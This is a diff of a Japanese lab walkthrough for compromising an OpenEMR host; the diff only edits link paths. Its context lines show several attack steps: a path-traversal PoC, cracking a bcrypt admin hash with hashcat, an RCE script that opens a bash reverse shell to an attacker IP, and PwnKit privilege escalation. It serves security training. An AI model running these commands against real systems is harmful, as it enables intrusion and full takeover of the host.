@@ -18,7 +18,7 @@ Kernel Exploit である PwnKit を用いて権限昇格。
 
 5. OpenEMR には データベースパスワードが保存されいてる PHP ファイルがあるが、RESPONSIVE filemanager の脆弱性は HTTP サービスにPHPファイルをペーストして中身を読み込むものであるため、OpenEMR の PHP ファイルをHTTP サービスにペーストしてからアクセスすると、PHP ファイルが実行され、中身が読み取れないことを確認
 
-6. Documents ディレクトリが、HTTP と SMB 双方からアクセスできる物理ディレクトリであるため、[WebShell](../../Cheatsheet/Common/WebShell.md#Webアプリのソースコードを取得する考え方と手法概要)に従い、Path Traversal ([49359 - Exploit-DB](https://www.exploit-db.com/exploits/49359)) の PoC で Documents にペーストするように修正
+6. Documents ディレクトリが、HTTP と SMB 双方からアクセスできる物理ディレクトリであるため、[WebShell](../Cheatsheet/Common/WebShell.md#Webアプリのソースコードを取得する考え方と手法概要)に従い、Path Traversal ([49359 - Exploit-DB](https://www.exploit-db.com/exploits/49359)) の PoC で Documents にペーストするように修正
 ```python
 # 修正前
 ...
@@ -40,7 +40,7 @@ def paste_clipboard(url, session_cookie):
 ```sh
 $ mysql -u openemr -h $TargetIP -p --skip-ssl
 ```
-![](../../画像ファイル/Pasted%20image%2020260214165811.png)
+![](../画像ファイル/Pasted%20image%2020260214165811.png)
 ```sh
 $ echo -n '$2a$05$bJcIfCBjN5Fuh0K9qfoe0eRJqMdM49sWvuSGqv84VMMAkLgkK8XnC' > admin_hash.txt
 $ hashcat admin_hash.txt -m 3200 -a 0 /usr/share/wordlists/rockyou.txt --force
@@ -51,7 +51,7 @@ $ hashcat admin_hash.txt -m 3200 -a 0 /usr/share/wordlists/rockyou.txt --force
 python2 openemr_rce.py http://192.168.155.145/openemr -u admin -p thedoctor -c 'bash -i >& /dev/tcp/192.168.45.182/443 0>&1'
 ```
 
-9. www-data としてシェルを獲得したので、 LinPEAS を実行し、特に興味深い情報がないことを確認したので、 [💥Linux Privilege Escalation](../../Cheatsheet/🐧Linux/💥Linux%20Privilege%20Escalation.md#PwnKit%20(CVE-2021-4034))に従い、 `hostnamectl` を実行して、PwnKit に脆弱であることを確認のうえ実行し、 rootゲット
+9. www-data としてシェルを獲得したので、 LinPEAS を実行し、特に興味深い情報がないことを確認したので、 [💥Linux Privilege Escalation](../Cheatsheet/🐧Linux/💥Linux%20Privilege%20Escalation.md#PwnKit%20(CVE-2021-4034))に従い、 `hostnamectl` を実行して、PwnKit に脆弱であることを確認のうえ実行し、 rootゲット
 
 ---
 
